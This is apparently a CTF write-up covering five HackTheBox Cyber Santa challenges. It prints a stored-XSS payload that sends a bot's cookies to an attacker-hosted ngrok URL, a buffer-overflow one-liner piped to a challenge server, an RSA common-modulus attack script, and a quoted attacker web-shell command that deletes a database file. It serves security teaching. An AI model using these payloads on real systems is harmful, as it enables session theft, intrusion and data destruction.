---
title: Cyber Santa (HackTheBox CTF)
date: 2021-12-01 17:19:00 +0800
categories: [ctf]
tags: [web]
---

![](/assets/images/cybersanta.jpg){:height="414px" width="615px"}

# Challenges
* Web
    * Toy Workshop (Day 1)
* Pwn
    * MrSnowy (Day 1)
* Crypto
    * Common Mistake (Day 1)
* Reversing
    * Infiltration (Day 1)
* Forensics
    * baby APT (Day 1)

# Web

## Toy Workshop (Day 1)

> The work is going well on Santa's toy workshop but we lost contact with the manager in charge! We suspect the evil elves have taken over the workshop, can you talk to the worker elves and find out?
> Downloadable content: `web_toy_workshop.zip`

![](/assets/images/cybersanta1.png)

When we click on any of the elfs, we are presented with a speech bubble where we could input a query and send it to the manager!

![](/assets/images/cybersanta2.png)

Inputting anything and clicking `Send` will just return the message `Your message is delivered successfully!`. 

Moving on, we opened the `web_toy_workshop.zip` file to get all the relevant files in the application.

```
.
├── build-docker.sh
├── challenge
│   ├── bot.js
│   ├── database.js
│   ├── index.js
│   ├── package.json
│   ├── routes
│   │   └── index.js
│   ├── static
│   │   ├── audio
│   │   │   └── ...
│   │   ├── css
│   │   │   ├── ...
│   │   ├── images
│   │   │   ├── ...
│   │   └── js
│   │       ├── ...
│   └── views
│       ├── index.hbs
│       └── queries.hbs
├── config
│   └── ...
└── Dockerfile
```

Zooming into the `challenge/bot.js` file, we see that it contains the code of the bot that pretends to be the manager.

```javascript
const puppeteer = require('puppeteer');

const browser_options = {
    headless: true,
    args: [
        '--no-sandbox',
        '--disable-background-networking',
        '--disable-default-apps',
        '--disable-extensions',
        '--disable-gpu',
        '--disable-sync',
        '--disable-translate',
        '--hide-scrollbars',
        '--metrics-recording-only',
        '--mute-audio',
        '--no-first-run',
        '--safebrowsing-disable-auto-update',
        '--js-flags=--noexpose_wasm,--jitless'
    ]
};

const cookies = [{
    'name': 'flag',
    'value': 'HTB{f4k3_fl4g_f0r_t3st1ng}'
}];


const readQueries = async (db) => {
    const browser = await puppeteer.launch(browser_options);
    let context = await browser.createIncognitoBrowserContext();
    let page = await context.newPage();
    await page.goto('http://127.0.0.1:1337/');
    await page.setCookie(...cookies);
    await page.goto('http://127.0.0.1:1337/queries', {
        waitUntil: 'networkidle2'
    });
    await browser.close();
    await db.migrate();
};

module.exports = { readQueries };
```

From the `readQueries` function, we see that the manager will:
1) Visit the home page.
2) Set the cookies which contains the flag.
3) Visit the `/queries` page.

Since it will be visiting the `/queries` page, we can find the code for this route in `challenge/routes/index.js`.

```javascript
const express        = require('express');
const router         = express.Router();
const bot            = require('../bot');

let db;

const response = data => ({ message: data });

router.get('/', (req, res) => {
    return res.render('index');
});

router.post('/api/submit', async (req, res) => {

    const { query } = req.body;
    if(query){
        return db.addQuery(query)
            .then(() => {
                bot.readQueries(db);
                res.send(response('Your message is delivered successfully!'));
            });
    }
    return res.status(403).send(response('Please write your query first!'));
});

router.get('/queries', async (req, res, next) => {
    if(req.ip != '127.0.0.1') return res.redirect('/');

    return db.getQueries()
        .then(queries => {
                res.render('queries', { queries });
        })
        .catch(() => res.status(500).send(response('Something went wrong!')));
});

module.exports = database => { 
    db = database;
    return router;
}; 
```

From the code following the `router.get('/queries ...` line, we see that it will fetch all the queries from the database and attempt to render it using `queries` template, which can found in `challenge/views/queries.hbs`.

```html
<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>Toy Workshop</title>
        <link rel="icon" href="/static/images/logo.png" />
        <link rel="stylesheet" type="text/css" href="/static/css/nes-core.min.css" />
        <link rel="stylesheet" type="text/css" href="/static/css/dashboard.css" />
    </head>
    <body>
        <img src="/static/images/cflower.png" class="main-logo" />
        <p class="pb-3">Welcome back, admin!</p>
        <div class="dash-frame">
            {{#each queries}}
            <p>{{{this.query}}}</p>
            {{else}}
            <p class="empty">No content</p>
            {{/each}}
        </div>
    </body>
    <script type="text/javascript" src="/static/js/jquery-3.6.0.min.js"></script>
    <script type="text/javascript" src="/static/js/auth.js"></script>
</html> 
```

We see that no escaping of dangerous characters is performed, meaning we could send a XSS payload and it will be rendered and executed!

To steal the cookies from the bot, we can get it to render an image from a URL that has the cookies appended to it.

To do so, we will need to host a external facing web server to receive the request. I'm going to be starting a local web server using `python3` and use `ngrok` to make it publicly accessible.

```bash
$ python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
$ ngrok http 80
ngrok by @inconshreveable    (Ctrl+C to quit)
                                                                                                                                                        
Session Status                online                                                                                                                    
Session Expires               1 hour, 59 minutes                                                                                                        
Version                       2.3.40                                                                                                                    
Region                        United States (us)                                                                                                        
Web Interface                 http://127.0.0.1:4040                                                                                                     
Forwarding                    http://XXXX.ngrok.io -> http://localhost:80                                                                
Forwarding                    https://XXXX.ngrok.io -> http://localhost:80
```

With that done, we can send the following payload to the manager. (Replace the `XXXX` with the assigned subdomain from the `ngrok` output)

```html
<script>document.write('<img src="http://XXXX.ngrok.io?cookie=' + document.cookie + '" />')</script>
```

After sending our XSS payload to the manager, we will subsequently receive a `HTTP` request containing the manager's cookie.

![](/assets/images/cybersanta3.png)

Flag: `HTB{3v1l_3lv3s_4r3_r1s1ng_up!}`

# Pwn

## MrSnowy (Day 1)

> There is ❄️ snow everywhere!! Kids are playing around, everything looks amazing. But, this ☃️ snowman... it scares me.. He is always 👀 staring at Santa's house. Something must be wrong with him.
> Downloadable content: `pwn_mr_snowy.zip`

Inside the `pwn_mr_snowy.zip`, we get a binary `mr_snowy`.

Opening it up with `ghidra`, we jump to the `main` function:

```c
undefined8 main(void)

{
    setup();
    banner();
    snowman();
    return 0;
}
```

`setup()` and `banner()` were mainly just UI-related functions, so lets zoom into `snowman()`.

```c
void snowman(void)

{
    int iVar1;
    char local_48 [64];
    
    printstr(&DAT_004019a8);
    fflush(stdout);
    read(0,local_48,2);
    iVar1 = atoi(local_48);
    if (iVar1 != 1) {
        printstr("[*] It\'s just a cute snowman after all, nothing to worry about..\n");
        color("\n[-] Mission failed!\n",&DAT_0040161a,&DAT_00401664);
            /* WARNING: Subroutine does not return */
        exit(-0x45);
    }
    investigate();
    return;
}
```

We see that it reads in 2 bytes into a buffer of 64 bytes, followed by calling `atoi()` on it to convert the contents into an integer. And if the integer is not equals to `1`, then it will just exit. Therefore we may want to enter `1` for this.

```bash
$ ./mr_snowy                   

                                                                                                                                                        
[Location]: 🎅 Santa's garden..
   _____    *  *  *  *  *     *  *                           
   |   |        *   *    *   * **                         
  _|___|_     *  *  *   *  **  *                                      
  ( 0 0 )   *   *  *   * *   * *   *                                 
 (   *   )    *   *    *    *   * * 
(    *    )      *  *   *  *   *  *            
 \_______/    *   *   *  ***   **                                                                             


[*] This snowman looks sus..  
                                                                                                                                                        
1. Investigate 🔎 
2. Let it be   ⛄ 
> 1 
                                                                                                                                                        
[!] After some investigation, you found a secret camera inside the snowman! 
                                                                                                                                                        
1. Deactivate ⚠ 
2. Break it   🔨
```


Passing that check, we see that there is a call to `investigate()`.

```c

void investigate(void)

{
    int iVar1;
    char local_48 [64];
    
    fflush(stdout);
    printstr(&DAT_00401878);
    fflush(stdout);
    read(0,local_48,0x108);
    iVar1 = atoi(local_48);
    if (iVar1 == 1) {
        puts("\x1b[1;31m");
        printstr("[!] You do not know the password!\n[-] Mission failed!\n");
            /* WARNING: Subroutine does not return */
        exit(0x16);
    }
    iVar1 = atoi(local_48);
    if (iVar1 == 2) {
        puts("\x1b[1;31m");
        printstr(
            "[!] This metal seems unbreakable, the elves seem to have put a spell on it..\n[-] Mission failed!\n"
            );
            /* WARNING: Subroutine does not return */
        exit(0x16);
    }
    fflush(stdout);
    puts("\x1b[1;31m");
    fflush(stdout);
    puts("[-] Mission failed!");
    fflush(stdout);
    return;
}
```

Looking carefully, we see that there is a `read()` call that reads `0x108` or `264` bytes into a buffer of `64` bytes. This means we can write beyond the boundaries of the buffer and overwrite the return address stored in the stack.

Another observation that was made is that there was another unused function called `deactivate_camera()`. 

```c

void deactivate_camera(void)

{
    char acStack104 [48];
    FILE *local_38;
    char *local_30;
    undefined8 local_28;
    int local_1c;
    
    local_1c = 0x30;
    local_28 = 0x2f;
    local_30 = acStack104;
    local_38 = fopen("flag.txt","rb");
    if (local_38 == (FILE *)0x0) {
        fwrite("[-] Could not open flag.txt, please conctact an Administrator.\n",1,0x3f,stdout);
        /* WARNING: Subroutine does not return */
        exit(-0x45);
    }
    fgets(local_30,local_1c,local_38);
    puts("\x1b[1;32m");
    fwrite("[+] Here is the secret password to deactivate the camera: ",1,0x3a,stdout);
    puts(local_30);
    fclose(local_38);
    return;
}
```

Judging from this, we can probably guess that we are supposed to jump to this function to retrieve the flag. Getting its address is as simple as running `objump -d mrsnowy`.

With a bit of fiddling around with back-to-back `python` commands to generate my payload and `dmesg` to check the resultant contents of the instruction pointer, here was the final command that achieved the desired result:

```bash
python3 -c 'print("1\n" + "A"*72 + "\x65\x11\x40\x00",end="")' | nc 206.189.19.177 30077
```

To break it down, the `"1\n"` allows to us first specify that we want to investigate the snowman, followed by `"A"*72"` to fill the buffer and allow us to reach to the stored return address. Finally, we add the address of the `deactivate_camera()` function in reverse order.

![](/assets/images/cybersanta4.png)

Flag: `HTB{n1c3_try_3lv35_but_n0t_g00d_3n0ugh}`

# Crypto

## Common Mistake (Day 1)

> Elves are trying very hard to communicate in perfect secrecy in order to keep Santa's warehouse. Unfortunately, their lack of knowledge about cryptography leads them to common mistakes.
> Downloadable content: `crypto_common_mistake.zip`

Inside the `crypto_common_mistake.zip` is an `encrypted.txt` with the following contents:
```json
{'n': '0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef', 'e': '0x10001', 'ct': '0x55cfe232610aa54dffcfb346117f0a38c77a33a2c67addf7a0368c93ec5c3e1baec9d3fe35a123960edc2cbdc238f332507b044d5dee1110f49311efc55a2efd3cf041bfb27130c2266e8dc61e5b99f275665823f584bc6139be4c153cdcf153bf4247fb3f57283a53e8733f982d790a74e99a5b10429012bc865296f0d4f408f65ee02cf41879543460ffc79e84615cc2515ce9ba20fe5992b427e0bbec6681911a9e6c6bbc3ca36c9eb8923ef333fb7e02e82c7bfb65b80710d78372a55432a1442d75cad5b562209bed4f85245f0157a09ce10718bbcef2b294dffb3f00a5a804ed7ba4fb680eea86e366e4f0b0a6d804e61a3b9d57afb92ecb147a769874'}
{'n': '0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef', 'e': '0x23', 'ct': '0x79834ce329453d3c4af06789e9dd654e43c16a85d8ba0dfa443aefe1ab4912a12a43b44f58f0b617662a459915e0c92a2429868a6b1d7aaaba500254c7eceba0a2df7144863f1889fab44122c9f355b74e3f357d17f0e693f261c0b9cefd07ca3d1b36563a8a8c985e211f9954ce07d4f75db40ce96feb6c91211a9ff9c0a21cad6c5090acf48bfd88042ad3c243850ad3afd6c33dd343c793c0fa2f98b4eabea399409c1966013a884368fc92310ebcb3be81d3702b936e7e883eeb94c2ebb0f9e5e6d3978c1f1f9c5a10e23a9d3252daac87f9bb748c961d3d361cc7dacb9da38ab8f2a1595d7a2eba5dce5abee659ad91a15b553d6e32d8118d1123859208'} 
```

We see that there 2 ciphertexts, each having their own `e` value. However, we observe that the `n` value is the same for both, so we are possbily seeing a `Common Modulus` problem.

To get the message, I used the following `python` script (Referenced from https://wellingtonlee.gitlab.io/2017/11/14/2017-11-14-Common-Modulus-Writeup/):

```python
import binascii
import gmpy2

n = 0xa96e6f96f6aedd5f9f6a169229f11b6fab589bf6361c5268f8217b7fad96708cfbee7857573ac606d7569b44b02afcfcfdd93c21838af933366de22a6116a2a3dee1c0015457c4935991d97014804d3d3e0d2be03ad42f675f20f41ea2afbb70c0e2a79b49789131c2f28fe8214b4506db353a9a8093dc7779ec847c2bea690e653d388e2faff459e24738cd3659d9ede795e0d1f8821fd5b49224cb47ae66f9ae3c58fa66db5ea9f73d7b741939048a242e91224f98daf0641e8a8ff19b58fb8c49b1a5abb059f44249dfd611515115a144cc7c2ca29357af46a9dc1800ae9330778ff1b7a8e45321147453cf17ef3a2111ad33bfeba2b62a047fa6a7af0eef

e1 = 0x10001
e2 = 0x23
c1 = 0x55cfe232610aa54dffcfb346117f0a38c77a33a2c67addf7a0368c93ec5c3e1baec9d3fe35a123960edc2cbdc238f332507b044d5dee1110f49311efc55a2efd3cf041bfb27130c2266e8dc61e5b99f275665823f584bc6139be4c153cdcf153bf4247fb3f57283a53e8733f982d790a74e99a5b10429012bc865296f0d4f408f65ee02cf41879543460ffc79e84615cc2515ce9ba20fe5992b427e0bbec6681911a9e6c6bbc3ca36c9eb8923ef333fb7e02e82c7bfb65b80710d78372a55432a1442d75cad5b562209bed4f85245f0157a09ce10718bbcef2b294dffb3f00a5a804ed7ba4fb680eea86e366e4f0b0a6d804e61a3b9d57afb92ecb147a769874
c2 = 0x79834ce329453d3c4af06789e9dd654e43c16a85d8ba0dfa443aefe1ab4912a12a43b44f58f0b617662a459915e0c92a2429868a6b1d7aaaba500254c7eceba0a2df7144863f1889fab44122c9f355b74e3f357d17f0e693f261c0b9cefd07ca3d1b36563a8a8c985e211f9954ce07d4f75db40ce96feb6c91211a9ff9c0a21cad6c5090acf48bfd88042ad3c243850ad3afd6c33dd343c793c0fa2f98b4eabea399409c1966013a884368fc92310ebcb3be81d3702b936e7e883eeb94c2ebb0f9e5e6d3978c1f1f9c5a10e23a9d3252daac87f9bb748c961d3d361cc7dacb9da38ab8f2a1595d7a2eba5dce5abee659ad91a15b553d6e32d8118d1123859208

not_used, a, b = gmpy2.gcdext(e1, e2)
assert a*e1 + b*e2 == 1

# We need this step since b comes out to be negative
i = int(gmpy2.invert(c2, n))

# Use modular exponentiation for faster computation
m = (pow(c1, int(a), n)*pow(i, -int(b), n))%n

# Print the flag from hex format
print(binascii.unhexlify(hex(m)[2:])) 
```

The output of the script gives us the flag.

Flag: `HTB{c0mm0n_m0d_4774ck_15_4n07h3r_cl4ss1c}`

## Reversing

## Infiltration (Day 1)

> We got a hold of an internal communication tool being used by the elves, and managed to hook it up to their server. However, it won't let us see their secrets? Can you take a look inside?
> Downloadable content: `rev_infiltration.zip`

Inside of `rev_infiltration.zip` was a binary `client`. Executing it without any arguments shows us the command format:

```bash
$ ./client                     
./client [server] [port]
```

If we execute it with the IP address and port number of the server, we get the following output in the shell:

```bash 
$ ./client 46.101.79.205 32206
[!] Untrusted Client Location - Enabling Opaque Mode                
```

While decompiling using `Ghidra` could help, I decided to use Wireshark to take a look at what was being sent between the program and the server.

After filtering down to the relevant packets (either by filtering by IP address using `ip.addr == 46.101.79.205` or by port number using `tcp.port == 32206`), I followed the TCP stream of these packets. 

Immediately, the flag can be spotted in the stream.

Flag: `HTB{n0t_qu1t3_s0_0p4qu3}`


# Forensics

## baby APT (Day 1)

> This is the most wonderful time of the year, but not for Santa's incident response team. Since Santa went digital, everyone can write a letter to him using his brand new website. Apparently an APT group hacked their way in to Santa's server and destroyed his present list. Could you investigate what happened?
> Downloadedable content: `rev_infiltration.zip`

Inside of `rev_infiltration.zip` was a PCAP file `christmaswishlist.pcap`.

Since the description talked about hacking into Santa's website, we can focus on HTTP traffic by using the `http` filter.

Following the traffic by right-clicking on any of the HTTP packets and going `Follow > HTTP Stream`, we can view the full HTTP interaction. Inside one of the streams, we observe that there was a response to `/bg.php` that had the title `Web Shell`.

![](/assets/images/cybersanta5.png)

From this, we can probably guess that the APT group had managed to upload a web shell (`/bg.php`) and are using it to execute arbitrary commands. We can then go ahead and look for requests to `/bg.php` by using `http.request.uri == "/bg.php"` as our filter.

Among the requests that are used to execute commands using the web shell, there was one that had a long weird command: 

```bash
rm  /var/www/html/sites/default/files/.ht.sqlite && echo SFRCezBrX24wd18zdjNyeTBuM19oNHNfdDBfZHIwcF8wZmZfdGgzaXJfbDN0dDNyc180dF90aDNfcDBzdF8wZmYxYzNfNGc0MW59 > /dev/null 2>&1 && ls -al  /var/www/html/sites/default/files
```

Inside was a base64-encoded string that is echoed to `/dev/null`. Decoding it, we get the flag.

Flag: `HTB{0k_n0w_3v3ry0n3_h4s_t0_dr0p_0ff_th3ir_l3tt3rs_4t_th3_p0st_0ff1c3_4g41n}`


